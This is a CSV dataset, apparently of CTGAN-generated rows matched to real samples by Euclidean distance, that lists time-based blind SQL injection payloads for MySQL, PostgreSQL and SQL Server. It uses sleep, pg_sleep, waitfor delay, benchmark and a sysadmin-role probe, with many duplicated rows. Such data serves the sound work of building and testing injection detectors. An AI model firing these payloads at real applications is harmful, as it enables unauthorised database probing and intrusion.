id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000062,attack,time,"1'||  (  select 'mzsy' where 4940  =  4940 or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000149,7.56117449882259
CTGAN_000063,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000169,7.652980769106744
CTGAN_000064,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000022,6.122900464161083
CTGAN_000065,attack,time,"1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000163,4.442847432066098
CTGAN_000066,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,6.187158207667211
CTGAN_000067,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,6.315863597912448
CTGAN_000068,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000161,4.524640388994034
CTGAN_000069,attack,time,"1""  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000248,5.673520700120718
CTGAN_000070,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R000021,7.417885693183708
CTGAN_000071,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000273,6.242267952532361
CTGAN_000072,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000064,7.389090782347208
CTGAN_000073,attack,time,1'   )    )    and sleep  (  5  )   and    (    (   'jiio' like 'jiio,nearest_attack_euclidean,R000059,5.515528179626633
CTGAN_000074,attack,time,", if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",nearest_attack_euclidean,R000003,9.65358740257824
CTGAN_000075,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000274,5.757307883919681
CTGAN_000076,attack,time,"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",nearest_attack_euclidean,R000260,7.471529416229064
CTGAN_000077,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R000202,6.311659851399937
CTGAN_000078,attack,time,1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,nearest_attack_euclidean,R000307,7.38374294208311
CTGAN_000079,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000290,5.708470731036153
CTGAN_000080,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000279,6.405440649333227
CTGAN_000081,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,6.11380239607629
CTGAN_000082,attack,time,1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,nearest_attack_euclidean,R000146,6.039881856968156
CTGAN_000083,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000157,6.916016388893804
CTGAN_000084,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R000254,4.988110222892803
CTGAN_000085,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,9.638028325005706
CTGAN_000086,attack,time,1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,nearest_attack_euclidean,R000148,5.600837293731233
CTGAN_000087,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000261,5.614133700659185
CTGAN_000088,attack,time,1'  )   where 5540  =  5540 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000258,5.5853208752444505
CTGAN_000089,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,5.65889969435328
CTGAN_000090,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,6.477968796119308
CTGAN_000091,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,5.9574643887236665
CTGAN_000092,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000249,5.739597265201774
CTGAN_000093,attack,time," or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000006,6.090798202153726
CTGAN_000094,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,6.37338498386793
CTGAN_000095,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000084,7.6957146373004335
CTGAN_000096,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,7.006021104983713
CTGAN_000097,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000160,6.196188911157109
CTGAN_000098,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000157,7.711960716678034
CTGAN_000099,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,7.3322611091553735
CTGAN_000100,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000168,4.790157660656048
CTGAN_000101,attack,time,"1""   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000169,5.328856969620419
CTGAN_000102,attack,time,select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr,nearest_attack_euclidean,R000270,5.5183065192236604
CTGAN_000103,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000252,5.216641089262938
CTGAN_000104,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000057,5.1511020554559215
CTGAN_000105,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,5.42710054221749
CTGAN_000106,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000042,6.827983330569436
CTGAN_000107,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,5.494699162133595
CTGAN_000108,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000203,5.492075119593302
CTGAN_000109,attack,time,1' where 7828  =  7828 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000119,5.395848785447545
CTGAN_000110,attack,time,1'   )    )    as hpta where 5376  =  5376 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000172,7.341016342621461
CTGAN_000111,attack,time,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'pjrf'  =  'pjrf",nearest_attack_euclidean,R000273,7.051372977913583
CTGAN_000112,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000293,6.061144478712505
CTGAN_000113,attack,time,1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,nearest_attack_euclidean,R000232,6.796241572305672
CTGAN_000114,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000269,6.644863896531023
CTGAN_000115,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000027,6.398992272905493
CTGAN_000116,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,4.2804086106623185
CTGAN_000117,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,5.419527372205612
CTGAN_000118,attack,time,"1"" and elt  (  1210  =  1210,sleep  (  5   )    )   ",nearest_attack_euclidean,R000135,5.146571302793778
CTGAN_000119,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'gfpd'  =  'gfpd",nearest_attack_euclidean,R000034,5.799918394543862
CTGAN_000120,attack,time,"1'   )    )    as fusi where 2788  =  2788 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000239,6.7648125338501846
CTGAN_000121,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000143,4.099846796448397
CTGAN_000122,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,6.4584901695470815
CTGAN_000123,attack,time,1'+  (  select iowv where 6105  =  6105 and sleep  (  5  )  #,nearest_attack_euclidean,R000143,6.402099214711126
CTGAN_000124,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,5.567126484774997
CTGAN_000125,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000160,6.970327988643582
CTGAN_000126,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000160,5.981418560654666
CTGAN_000127,attack,time,"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000103,5.5054936298667
CTGAN_000128,attack,time,"select pg_sleep  (  5  )   and ""%""  =  """,nearest_attack_euclidean,R000088,8.95746240032705
CTGAN_000129,attack,time,1  )   where 4600  =  4600 or sleep  (  5  )  --,nearest_attack_euclidean,R000141,6.013198457418341
CTGAN_000130,attack,time,"1""   )    )    as dpln where 4193  =  4193 rlike sleep  (  5  )  --",nearest_attack_euclidean,R000275,7.650436180593243
CTGAN_000131,attack,time,1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --,nearest_attack_euclidean,R000203,6.290443567631917
CTGAN_000132,attack,time,1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'ayol'  =  'ayol,nearest_attack_euclidean,R000049,5.556192962340845
CTGAN_000133,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,5.265605917153289
CTGAN_000134,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000038,7.120202594717693
CTGAN_000135,attack,time,select sleep  (  5  )   and    (    (   'ilcv'  =  'ilcv,nearest_attack_euclidean,R000094,4.6948406363726995
CTGAN_000136,attack,time,1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz,nearest_attack_euclidean,R000038,6.163485101669507
CTGAN_000137,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000168,6.407477358258556
CTGAN_000138,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000168,5.886418254449468
CTGAN_000139,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,6.472236609436716
CTGAN_000140,attack,time,1'   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   'cqwz' like 'cqwz,nearest_attack_euclidean,R000042,6.683729264362808
CTGAN_000141,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   ",nearest_attack_euclidean,R000157,6.719034749349985
CTGAN_000142,attack,time,1'+  (  select ejaj where 1651  =  1651 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )     )  +',nearest_attack_euclidean,R000128,7.672029376332466
CTGAN_000143,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,nearest_attack_euclidean,R000138,6.28219505869724
CTGAN_000144,attack,time,"1  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000297,6.616279512610791
CTGAN_000145,attack,time,"1'  )   where 4778  =  4778 and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000231,4.672774305840146
CTGAN_000146,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000064,5.44903488742322
CTGAN_000147,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,6.0438310479599915
CTGAN_000148,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,5.179594767528536
CTGAN_000149,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,4.780594786447629
CTGAN_000150,attack,time,1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000312,8.292625654169262
CTGAN_000151,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000249,5.76405437318628
CTGAN_000152,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,6.3566098541573925
CTGAN_000153,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,7.382635747102125
CTGAN_000154,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,7.066628861570005
CTGAN_000155,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000127,6.074846540248596
CTGAN_000156,attack,time,"1""   )    )    as ndbk where 5042  =  5042 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000111,6.658280041168835
CTGAN_000157,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,6.6052627466807206
CTGAN_000158,attack,time,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R000132,6.420380288657933
CTGAN_000159,attack,time,"1""   )    )    as gbxx where 2459  =  2459 waitfor delay '0:0:5'--",nearest_attack_euclidean,R000274,5.3779530918060345
CTGAN_000160,attack,time,"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'obeh'  =  'obeh",nearest_attack_euclidean,R000120,4.913259018271475
CTGAN_000161,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000066,4.921670898840889
CTGAN_000162,attack,time,1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --,nearest_attack_euclidean,R000293,6.467003216824939
CTGAN_000163,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,6.361756339346259
CTGAN_000164,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000066,8.403211095465979
CTGAN_000165,attack,time,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000084,7.603823708511882
CTGAN_000166,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,5.530200187456673
CTGAN_000167,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R000253,6.188887089111067
CTGAN_000168,attack,time,"1""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,6.256545419045447
CTGAN_000169,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xwsb'  =  'xwsb",nearest_attack_euclidean,R000036,5.8006625909510445
CTGAN_000170,attack,time,1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000261,5.244953994344793
CTGAN_000171,attack,time,"1""   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   ""cowu"" like ""cowu",nearest_attack_euclidean,R000116,7.48579570339805
CTGAN_000172,attack,time,"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000205,5.244049379758904
CTGAN_000173,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R000126,5.776515228595167
CTGAN_000174,attack,time,waitfor delay '0:0:5' and    (    (   7619  =  7619,nearest_attack_euclidean,R000072,4.2830360766648345
